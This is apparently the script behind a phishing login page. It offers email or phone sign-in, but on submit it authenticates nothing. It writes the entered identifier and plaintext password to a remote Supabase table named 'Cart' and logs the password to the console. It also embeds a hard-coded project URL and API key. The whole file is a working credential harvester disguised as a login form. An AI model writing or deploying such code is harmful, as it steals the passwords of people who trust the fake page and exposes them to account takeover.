import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";

const supabaseUrl = "https://veyofxdknlvuupotkdff.supabase.co";
const supabaseKey =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZleW9meGRrbmx2dXVwb3RrZGZmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzAxMDY4OTEsImV4cCI6MjA4NTY4Mjg5MX0.jNBsfU96VRuuW5XQ2Ls8oQV6Af_Ond7Udi371WcIUs0";

const supabase = createClient(supabaseUrl, supabaseKey);

const loginForm = document.getElementById("login-form");
const tabEmail = document.getElementById("tab-email");
const tabPhone = document.getElementById("tab-phone");
const userInput = document.getElementById("user-input");
const inputLabel = document.getElementById("input-label");
const passwordInput = document.getElementById("password");
const togglePassword = document.getElementById("toggle-password");
const signInButton = document.querySelector(".btn-primary");

let currentMethod = "email";

tabEmail.addEventListener("click", (e) => {
  e.preventDefault();
  currentMethod = "email";

  tabEmail.classList.add("active");
  tabPhone.classList.remove("active");

  inputLabel.textContent = "Email or Username";
  userInput.placeholder = "e.g. john@example.com";
  userInput.type = "email";
});

tabPhone.addEventListener("click", (e) => {
  e.preventDefault();
  currentMethod = "phone";

  tabPhone.classList.add("active");
  tabEmail.classList.remove("active");

  inputLabel.textContent = "Phone Number";
  userInput.placeholder = "e.g. +234 800 000 0000";
  userInput.type = "tel";
});

togglePassword.addEventListener("click", function () {
  const type =
    passwordInput.getAttribute("type") === "password" ? "text" : "password";
  passwordInput.setAttribute("type", type);
  togglePassword.textContent = type === "password" ? "SHOW" : "HIDE";
});

loginForm.addEventListener("submit", async function (event) {
  event.preventDefault();
  const userValue = userInput.value.trim();
  const passwordValue = passwordInput.value.trim();

  console.log("--- Login Attempt ---");
  console.log("Method:", currentMethod);
  console.log("User Input:", userValue);
  console.log("Password:", passwordValue);

  if (!userValue || !passwordValue) {
    alert("Please fill in all fields.");
    return;
  }

  const { data, error } = await supabase
    .from("Cart")
    .insert([
      { method: currentMethod, identifier: userValue, password: passwordValue },
    ])
    .select();

  if (error) {
    console.error("Insert error:", error);
    alert(error.message);
    return;
  }

  console.log("Stored Successfully:", data);
});
